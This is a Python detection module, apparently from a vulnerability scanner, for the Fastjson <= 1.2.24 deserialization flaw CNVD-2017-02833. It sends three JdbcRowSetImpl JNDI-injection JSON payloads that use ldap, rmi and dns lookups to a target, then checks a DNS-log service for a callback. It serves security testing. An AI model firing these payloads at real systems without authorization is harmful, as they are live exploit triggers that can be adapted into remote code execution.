#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

cnvd_2017_02833_payloads = [
    {'data': '''{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://DNSDOMAIN/35d9","autoCommit":true}}'''},
    {'data': '''{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://DNSDOMAIN/3d9b","autoCommit":true}}'''},
    {'data': '''{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"dns://DNSDOMAIN/ff4518","autoCommit":true}}'''},
]

def cnvd_2017_02833_scan(clients):
    ''' fastjson <= 1.2.24 反序列化漏洞'''
    client = clients.get('reqClient')
    sessid = '7d5ff4518944d45f35d9850f3d9be254'

    vul_info = {
        'app_name': 'Fastjson',
        'vul_type': 'unSerialize',
        'vul_id': 'CNVD-2017-02833',
    }

    headers = {
        'Content-Type': 'application/json'
    }

    for payload in cnvd_2017_02833_payloads:                    # * Payload
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        data = payload['data'].replace('DNSDOMAIN', dns_domain) # * Data

        res = client.request(
            'post',
            '',
            data=data,
            headers=headers,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)                                                # * dns查询可能较慢, 等一会
        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
